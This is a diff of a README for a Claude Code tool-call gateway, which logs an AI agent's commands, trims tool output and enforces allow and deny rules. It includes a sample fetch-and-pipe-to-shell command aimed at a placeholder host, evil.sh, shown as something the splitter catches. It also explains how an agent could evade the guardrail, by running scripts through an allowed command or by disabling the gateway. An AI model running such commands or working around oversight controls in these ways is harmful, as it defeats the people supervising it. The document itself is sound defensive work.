@@ -20,8 +20,8 @@
 ## Features
 
 - 🔍 **Track every tool access:** see each command, file edit and web request your AI agent makes, live.
-- 🪶 **Reduce token usage on tool calls:** noisy output (colors, progress bars, passing tests, install logs, huge results) is trimmed before Claude reads it. Every option can be switched on, measured or off.
-- 🛡️ **Allow or deny commands globally:** one rule set for every project. Anything unknown is blocked until an admin approves it.
+- 🪶 **Reduce token usage on tool calls:** noisy output (colors, progress bars, passing tests, install logs, huge results) is trimmed before Claude reads it. Every option can be switched on or off.
+- 🛡️ **Allow or deny commands globally:** one rule set for every project. Anything unknown is denied until you allow it, in one click from the activity.
 
 ## How to use
 
@@ -33,7 +33,7 @@ No install needed, just Node.js 22.13 or newer.
 npx apichap-ai-coding-gateway init
 ```
 
-**That's it. Every tool call in new Claude Code sessions is now checked and logged.** It starts in monitor mode, so nothing is blocked until you switch to enforce.
+**That's it. Every tool call in new Claude Code sessions is now checked and logged.** It starts in monitor mode, so nothing is denied until you switch to enforce.
 
 ### 2. Open the admin dashboard
 
@@ -41,7 +41,7 @@ npx apichap-ai-coding-gateway init
 npx apichap-ai-coding-gateway dashboard
 ```
 
-Your browser opens the dashboard. There you watch tool calls live, approve requests and manage rules.
+Your browser opens the dashboard. There you watch tool calls live, allow denied calls and manage rules.
 
 ---
 
@@ -59,7 +59,7 @@ Your browser opens the dashboard. There you watch tool calls live, approve reque
 - [Development](#development)
 - [License](#license)
 
-The gateway hooks into every tool call Claude Code makes (Bash, Edit, Read, WebFetch, MCP tools, …). It logs each call, checks it against allow and deny rules, and files anything unknown as an **approval request** with a ready-made rule suggestion. When a call is blocked, Claude is told why and that an admin has to approve it. It then either continues without the call or stops and tells you. It is told not to work around the block.
+The gateway hooks into every tool call Claude Code makes (Bash, Edit, Read, WebFetch, MCP tools, …). It logs each call, checks it against allow and deny rules, and denies anything no rule allows. When a call is denied, Claude is told why and that you can allow it from the dashboard's Activity page, where the denied call offers ready-made allow rules. It then either continues without the call or stops and tells you. It is told not to work around the block.
 
 > **A guardrail, not a sandbox.** The gateway stops obvious mistakes and unwanted actions. It cannot stop a determined agent from writing a script inside the project and running it through an allowed command such as `npm run *`. Combine it with normal OS-level isolation where that matters.
 
@@ -106,11 +106,10 @@ The gateway hooks into every tool call Claude Code makes (Bash, Edit, Read, WebF
 
 ### Dashboard
 
-`dashboard` starts a local server on `http://127.0.0.1:4717` and opens it in your browser. The side menu has four pages:
+`dashboard` starts a local server on `http://127.0.0.1:4717` and opens it in your browser. The side menu has three pages:
 
-- **Activity:** every tool call as it happens, grouped by the prompt that triggered it, with your message, tokens per call and prompt, and the decision (allowed, denied, would deny). Click a call to see the original result next to what Claude received. Switch to _All calls_ for a flat list.
-- **Approvals:** pending requests with one-click _Approve exact_, _Approve broad_ or a custom rule, and _Reject_.
-- **Rules:** the rules table (enable, disable, delete, add) and a box that shows which rule decides a given call.
+- **Activity:** every tool call as it happens, grouped by the prompt that triggered it, with your message, tokens per call and prompt, and the decision (allowed, denied, would deny). Click a call to see the original result next to what Claude received. A denied call has **Allow this call…**, which offers an exact and a broad allow rule, or a custom one.
+- **Rules:** the rule groups, each a policy in plain words (switch a group on or off, add, move or delete its rules), import with a preview, and a box that shows which rule and policy decide a given call.
 - **Token savings:** every reduction option with its switch and what it saved.
 
 The enforcement mode (enforce, monitor or off) is switched in the sidebar.
@@ -119,19 +118,18 @@ The dashboard listens on 127.0.0.1 only. Every API call needs the random token p
 
 ### Token reduction
 
-After a tool runs, the gateway shortens its result before Claude reads it. Every option has its own switch on the dashboard's **Token savings** page, or via `reduction set <id> on|measure|off`:
+After a tool runs, the gateway shortens its result before Claude reads it. Every option has its own switch on the dashboard's **Token savings** page, or via `reduction set <id> on|off`:
 
 - **On** changes what Claude receives.
-- **Measure** only calculates what the option would save. Use it to try an option safely.
-- **Off** does nothing.
+- **Off** leaves the result as it is.
 
-| Group                 | Options (default)                                                                                                                                                                             |
-| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Lossless cleanup      | strip color codes, remove progress bars, collapse blank lines, collapse repeated lines, compact JSON (all on)                                                                                 |
-| Condense noisy output | condense test runs, condense install and build logs, fold framework stack frames, summarize lockfile and generated diffs, shorten very long lines (all on); condense framework logs (measure) |
-| Long output           | page long output (on): over 400 lines or 20,000 characters, Claude gets the first and last part and a file with the full output to page through with Read                                     |
-| Repeated content      | skip unchanged re-reads (measure): a second Read of the same unchanged file range gets a short note. It resets when Claude Code compacts or clears the conversation                           |
-| Before the call runs  | limit big file reads, limit Grep results, quiet npm installs, limit git log (all off). These change the tool call itself                                                                      |
+| Group                 | Options (default)                                                                                                                                                                         |
+| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Lossless cleanup      | strip color codes, remove progress bars, collapse blank lines, collapse repeated lines, compact JSON (all on)                                                                             |
+| Condense noisy output | condense test runs, condense install and build logs, fold framework stack frames, summarize lockfile and generated diffs, shorten very long lines (all on); condense framework logs (off) |
+| Long output           | page long output (on): over 400 lines or 20,000 characters, Claude gets the first and last part and a file with the full output to page through with Read                                 |
+| Repeated content      | skip unchanged re-reads (off): a second Read of the same unchanged file range gets a short note. It resets when Claude Code compacts or clears the conversation                           |
+| Before the call runs  | limit big file reads, limit Grep results, quiet npm installs, limit git log (all off). These change the tool call itself                                                                  |
 
 - **Tech stacks:** test runs from jest, vitest, mocha, node:test, pytest, cargo, go test, Maven, Gradle, JUnit, dotnet test, PHPUnit and RSpec; install and build logs from npm, pip, cargo, apt, Maven, Gradle, dotnet restore, Composer, Bundler and docker build; stack frames from Node, Python, Java, .NET and Go; framework logs from Spring Boot, Hibernate, Hikari, Tomcat, Netty, Kafka, Flyway and Jetty. Failures, errors and warnings always stay.
 - **Read results keep their exact text**, because Claude needs it to edit files. Only "skip unchanged re-reads" applies to them.
@@ -139,6 +137,14 @@ After a tool runs, the gateway shortens its result before Claude reads it. Every
 - **Token figures:** the dashboard shows tokens for every call (result, after reduction, saving) and for every prompt (tool tokens plus Claude Code's real API usage from the session transcript). Tool token counts are estimates of about 4 characters per token.
 
 ### Rules
+
+Rules are organised in **rule groups**. Each group is one policy in plain words, with the rules that implement it:
+
+> **The agent is not allowed to delete files**: `Shell(rm *)`, `Shell(rmdir *)`, `Shell(Remove-Item *)`, …
+>
+> **The agent is allowed to read and search files only inside the current project**: `FileRead({cwd}/**)`, …
+
+The Rules page lists the groups under _Not allowed_ and _Allowed_. You can switch a whole group on or off, open it to see and edit its rules, and move rules between groups. When a deny rule blocks a call, Claude is told the policy (the group title) as well as the rule.
 
 A rule is either `allow` or `deny`, and is written like Claude Code permission rules:
 
@@ -149,66 +155,80 @@ A rule is either `allow` or `deny`, and is written like Claude Code permission r
 | `Bash(git *)`                          | any git command. A trailing ` *` also matches the bare command, `git` |
 | `Shell(git *)`                         | the same for Bash **and** PowerShell                                  |
 | `Bash(* --force*)`                     | any command containing `--force`                                      |
+| `FileRead({cwd}/**)`                   | Read, Grep and Glob inside the current project                        |
 | `FileEdit({cwd}/**)`                   | Edit, Write, MultiEdit and NotebookEdit inside the current project    |
-| `File(**/.env*)`                       | reading or writing any `.env` file, anywhere                          |
+| `File(**/.env*)`                       | reading, searching or writing any `.env` file, anywhere               |
 | `WebFetch(https://docs.example.com/*)` | fetches from that site                                                |
 | `mcp__github__*`                       | every tool of the `github` MCP server                                 |
 
-- **Wildcards:** `*` matches anything and `?` matches one character. In file paths, `*` stays inside one folder and `**` crosses folders.
+- **Wildcards:** `*` matches anything and `?` matches one character. In file paths, `*` stays inside one folder and `**` crosses folders. A trailing `/**` also matches the folder itself.
 - **Placeholders:** `{cwd}` is the project folder of the session, `{home}` is your home folder and `{tmp}` is the system temp folder.
-- **What the pattern is checked against:** the command for `Bash` and `PowerShell`, the file path for `Read`, `Edit`, `Write` and `NotebookEdit`, and the URL for `WebFetch`. Other tools match by name only.
-- **Tool groups:** `Shell` = Bash + PowerShell, `FileEdit` = Edit, Write, MultiEdit, NotebookEdit, `File` = Read + FileEdit.
+- **What the pattern is checked against:** the command for `Bash` and `PowerShell`, the file path for `Read`, `Edit`, `Write` and `NotebookEdit`, the searched folder for `Grep` and `Glob` (the project folder when none is given), and the URL for `WebFetch`. Other tools match by name only.
+- **Tool groups:** `Shell` = Bash + PowerShell, `FileRead` = Read, Grep, Glob, `FileEdit` = Edit, Write, MultiEdit, NotebookEdit, `File` = FileRead + FileEdit.
 - **Case:** PowerShell commands and Windows paths are compared case-insensitively.
 
-About 160 default rules come built in, from [`rules/default-rules.json`](rules/default-rules.json). They allow everyday work (reading files, git, npm, running project scripts, formatting, tests, editing inside the project) and deny risky things (deleting files, force-push and other risky git, `sudo`, piping into a shell, inline code like `node -e`, secrets). Shell syntax such as loops, conditions and variable assignments is not treated as a command; only the commands inside it are checked.
+About 170 default rules in 16 groups come built in, from [`rules/default-rules.json`](rules/default-rules.json). They allow everyday work (reading and editing inside the project, git, npm, running project scripts, formatting, tests) and block risky things (deleting files, secrets, force-push and other risky git, `sudo`, piping into a shell, inline code like `node -e`, changing the gateway). Reading outside the project is denied until you allow it; shell commands like `cat` are not path-checked. Shell syntax such as loops, conditions and variable assignments is not treated as a command; only the commands inside it are checked.
 
 #### Rule files: import, export, defaults
 
-Rules are exchanged as a JSON file with an `allow` and a `deny` list. The default rules use the same format:
+Rules are exchanged as a JSON file with a list of groups. The default rules use the same format:
 
 ```json
 {
   "$schema": "https://unpkg.com/apichap-ai-coding-gateway/rules/rule-file.schema.json",
   "name": "My team rules",
   "version": 1,
-  "allow": [{ "rule": "Read" }, { "rule": "Shell(git *)", "note": "git; risky parts are denied below" }],
-  "deny": [{ "rule": "Shell(git push *--force*)", "note": "force-push rewrites shared history" }]
+  "groups": [
+    {
+      "id": "no-force-push",
+      "title": "The agent is not allowed to force-push",
+      "description": "Force-pushing rewrites shared history.",
+      "deny": [{ "rule": "Shell(git push *--force*)" }, { "rule": "Shell(git push -f*)" }]
+    },
+    {
+      "id": "git",
+      "title": "The agent is allowed to use git",
+      "allow": [{ "rule": "Shell(git *)", "note": "risky parts are denied above" }]
+    }
+  ]
 }
 ```
 
-- **Entries:** every entry is an object `{ "rule", "note", "enabled" }`, and only `rule` is required. For deny rules, the note is what Claude and the user see when the rule blocks.
+- **Groups:** `id` is a stable key (lowercase, digits, dashes) and `title` is the policy in one plain sentence. `description`, `enabled`, `allow` and `deny` are optional.
+- **Entries:** every rule is an object `{ "rule", "note", "enabled" }`, and only `rule` is required. The note adds detail for that one rule.
+- **Older files** with top-level `allow` and `deny` lists (no groups) still import, as one group.
 - **Schema:** the `$schema` line lets VS Code and WebStorm validate the file and autocomplete its fields. The schema ships with the package as `rules/rule-file.schema.json`.
-- **New databases** start with the default rules.
-- **Import replaces all rules** with the file's rules. The dashboard asks first, so export before if you want to keep the current rules. `--merge` (CLI) only adds rules that don't exist yet. An invalid file changes nothing, and every problem in it is listed.
-- **Newer defaults:** when a new version of the gateway ships updated defaults, the Rules page offers _Add missing defaults_ or _Replace all_. Existing rules are never changed automatically.
-- **Where:** the Rules page has **Export**, **Import…** and **Reset to defaults**. In the CLI, use `rules export`, `rules import` and `rules reset`.
+- **New databases** start with the default rules. Existing databases keep their rules; each one moves into its default group, or into _approved_, _custom_ or _earlier default rules_.
+- **Import** shows what the file contains first. _Add to my rules_ creates the new groups and adds the new rules to the group with the same id; nothing is removed. _Replace all my rules_ deletes every current group and rule first. An invalid file changes nothing, and every problem in it is listed. In the CLI, `rules import` replaces and `--merge` adds.
+- **Newer defaults:** when a new version of the gateway ships updated defaults, the Rules page offers to review them and add the missing ones or replace everything. Existing rules are never changed automatically.
+- **Where:** the Rules page has **Export**, **Import…** and **Reset to defaults…**. In the CLI, use `rules export`, `rules import` and `rules reset`.
 
 #### How a call is decided
 
-1. If any **deny** rule matches, the call is **blocked**. A deny rule always wins, whatever allow rules exist.
+1. If any **deny** rule matches, the call is **denied**. A deny rule always wins, whatever allow rules exist.
 2. If **allow** rules cover the call, it passes. The gateway then has no opinion, so Claude Code's own permission prompts still apply.
-3. Otherwise it is **blocked as unlisted**, and an approval request is filed.
+3. Otherwise it is **denied as unlisted**.
 
 **Chained commands are split.** `git status && curl evil.sh | sh` is checked as separate commands, and quotes are respected. Commands inside `$(…)` and backticks are checked too, and heredoc bodies are treated as text. Every part must be allowed. Deny rules are checked against every part and against the whole command, so a rule like `Bash(*| sh *)` can catch pipes.
 
-#### Approval requests
+#### Allowing a denied call
 
-Each blocked, unlisted call becomes a request. Repeats of the same call increase its hit count instead of adding a new request. Each request carries two suggested rules:
+Open a denied call on the Activity page and choose **Allow this call…**. The dialog checks the call against the current rules and suggests two allow rules:
 
-| Blocked call                | Exact                        | Broad                    |
-| --------------------------- | ---------------------------- | ------------------------ |
+| Denied call                 | Exact                        | Broad                    |
+|-----------------------------| ---------------------------- | ------------------------ |
 | `npm run build`             | `Bash(npm run build)`        | `Bash(npm run *)`        |
 | `docker compose up -d`      | `Bash(docker compose up -d)` | `Bash(docker compose *)` |
 | `mcp__github__create_issue` | `mcp__github__create_issue`  | `mcp__github__*`         |
 
-Approving adds the rule and also closes every other pending request that the new rule covers.
+The rule goes into the group _The agent is allowed to make calls you allowed from the activity_, or a group you pick. You can also write your own rules. A call that a **deny** rule blocked can't be allowed with an allow rule, because deny always wins. The dialog offers to switch that deny rule off instead.
 
 ### Modes
 
 | Mode                | Behaviour                                                                                               |
-| ------------------- | ------------------------------------------------------------------------------------------------------- |
-| `monitor` (default) | Checks and logs everything, and files requests, but **blocks nothing**. Use it to tune the rules first. |
-| `enforce`           | Blocks denied and unlisted calls. If the gateway itself fails, the call is blocked too.                 |
+| ------------------- |---------------------------------------------------------------------------------------------------------|
+| `monitor` (default) | Checks and logs everything, but **blocks nothing**. Use it to tune the rules first.                     |
+| `enforce`           | Blocks denied and unlisted calls. If the gateway itself fails, the call is denied too.                  |
 | `off`               | Only logs; no rule checks.                                                                              |
 
 Setting the environment variable `APICHAP_GATEWAY_MODE` overrides the stored mode. That's the escape hatch if the database is broken.
@@ -222,20 +242,20 @@ init [--installed | --local] [--settings <path>]   register the hooks in Claude 
 uninstall [--settings <path>]                  remove the hooks (data is kept)
 dashboard [--port 4717] [--no-open]            local web dashboard
 list [n]                                       last n tool calls
-rules [list]
-rules add allow|deny "Tool(pattern)" [--note "why"]
+rules [list]                                   the rule groups and their rules
+rules add allow|deny "Tool(pattern)" [--note "why"] [--group <key>]
 rules enable|disable|remove <id>
+rules move <id> <group key>
+rules groups [list]
+rules groups add "The agent is not allowed to ..." [--description "why"]
+rules groups enable|disable|remove <group key>
 rules test "Bash(git status && rm -rf x)"      which rule decides each part
 rules export [--out rules.json]                all rules as a rule file
 rules import <rules.json> [--merge]            replace all rules (--merge: only add new ones)
 rules reset [--merge]                          back to the default rules
-requests [list] [--all]
-requests approve <id> [--broad | --rule "Tool(pattern)"]
-requests reject <id>
 mode [enforce|monitor|off]
-policy [local|managed]
 reduction [list]                               token reduction options and savings
-reduction set <id> on|measure|off
+reduction set <id> on|off
 hook pre|post|session                          used by the Claude Code hooks (reads JSON from stdin)
 ```
 
@@ -244,23 +264,20 @@ hook pre|post|session                          used by the Claude Code hooks (re
 The starter rules stop Claude from:
 
 - editing `.claude/settings*.json`, where the hooks are registered
-- touching `~/.apichap-gateway`
-- running the gateway's own commands (`init`, `uninstall`, `rules`, `requests`, `mode`, `policy`, `dashboard`)
+- touching `~/.ai-coding-gateway`
+- running the gateway's own commands (`init`, `uninstall`, `rules`, `mode`, `dashboard`)
 
-Without these rules, an agent could switch the gateway off or approve its own requests.
+Without these rules, an agent could switch the gateway off or allow its own calls.
 
 ### Teams and enterprise (roadmap)
 
-A local database on a developer's machine can always be changed by that developer, so this version is aimed at **individual developers**. Two pieces are already in place for central management:
-
-- `policy managed` makes rules, approvals and mode read-only. The store layer refuses changes, so the CLI and the dashboard both do. In the dashboard, a developer then sees only their calls and the status of their requests.
-- Rule loading (`RuleSource`) and event recording (`EventSink`) are pluggable.
+A local database on a developer's machine can always be changed by that developer, so this version is aimed at **individual developers**. Rule loading (`RuleSource`) and event recording (`EventSink`) are pluggable, so central management can be added later.
 
 Planned: rules authored in a central admin dashboard and shipped as a signed bundle, the hook enforced through Claude Code managed settings, and every event also sent to a central audit log.
 
 ### Data
 
-All data lives in `~/.apichap-gateway/`: `gateway.sqlite` (the database), `errors.log`, and `spill/` (full output of paged results, kept 3 days). Set `APICHAP_GATEWAY_DIR` to use another folder.
+All data lives in `~/.ai-coding-gateway/`: `gateway.sqlite` (the database), `errors.log`, and `spill/` (full output of paged results, kept 3 days). Set `APICHAP_GATEWAY_DIR` to use another folder.
 
 ### Development
 
